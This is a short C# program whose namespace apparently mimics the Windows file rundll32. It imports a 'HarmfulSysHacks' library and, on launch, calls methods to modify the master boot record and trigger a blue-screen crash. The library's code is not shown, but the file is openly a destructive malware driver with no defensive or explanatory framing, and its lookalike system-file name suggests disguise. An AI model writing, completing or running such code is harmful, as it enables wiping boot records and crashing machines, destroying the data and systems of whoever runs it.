using VortexSecOps.HarmfulSysHacks;
namespace Rundl132
{
    internal class Programs
    {
        static void Main(string[] args)
        {
            IWindowsAPIOperator windowsAPIOperator = MalwareIntruder.Create<IWindowsAPIOperator>();
            windowsAPIOperator.ModifyMasterBootRecord();
            windowsAPIOperator.TriggerBlueScreen();
        }
    }
}
